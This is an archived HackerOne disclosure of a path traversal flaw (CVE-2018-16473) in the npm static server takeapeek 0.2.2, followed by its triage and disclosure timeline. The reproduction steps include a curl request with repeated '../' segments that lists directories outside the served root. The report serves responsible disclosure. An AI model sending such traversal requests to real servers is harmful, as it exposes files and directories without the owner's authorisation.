---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
  - stack/node
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2018-11-02
submitted: 2018-09-01T05:13:41.721Z
bounty_usd: null
votes: 6
cve: "CVE-2018-16473"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "abdilahrf_"
source: "https://hackerone.com/reports/403736"
title: "[takeapeek] Path traversal allow to expose directory and files"
---
# [takeapeek] Path traversal allow to expose directory and files

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 6 | **Program:** Node.js third-party modules | **Disclosed:** 2018-11-02

- Report: [https://hackerone.com/reports/403736](https://hackerone.com/reports/403736)
- CWE: Path Traversal | CVE: CVE-2018-16473
- Submitted: 2018-09-01T05:13:41.721Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report Path Travelsal in takeapeek
It allows attacker to list directory and files.

# Module

**module name:** takeapeek
**version:** 0.2.2
**npm page:** `https://www.npmjs.com/package/takeapeek`

## Module Description

A simple static webserver with only one command. Heavily inspired by glance, this is really more of a learning experience then anything.

## Module Stats

~100 downloads per month 

# Vulnerability

## Vulnerability Description

Attacker was able to exploit path traversal and view sensitive directory and files.

## Steps To Reproduce:

- `npm i takeapeek`
- `node node_modules/takeapeek/dist/bin.js`
- `curl --path-as-is http://localhost:3141/../../../../../../`

F340897


## Supporting Material/References:

- OS: Windows 10
- NODE: v10.8.0
- NPM : 6.2.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It allows attacker to list directory and files.

## Timeline

- **Report Filed**
- **2018-09-01** @api_xmgchqhv69rw1zem6733xop0tz: Hello,
Thanks for reporting this to us. Someone will quickly look at this report and triage it.
- **Report Triaged**
- **2018-09-07** @lirantal: Thanks @abdilahrf_ 
I invited the maintainer to help triage this report.
- **Changed Scope**
- **Report Severity Updated**
- **2018-09-07** @abdilahrf_: thanks @lirantal for the update,
let me know if anything i can do to help
- **2018-10-01** @lirantal: Nothing else except waiting to see if the author will jump in on the issue or I'll disclose upon 45 days.
- **2018-11-02** @lirantal: Will go ahead and disclose due to inactivity from the maintainer.
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
- **2026-08-28** @abdilahrf_: Hi, this report is currently in my pending bounty tabs. Could you please mark this report as ineligible for a bounty so that my pending bounty tabs can be cleared?
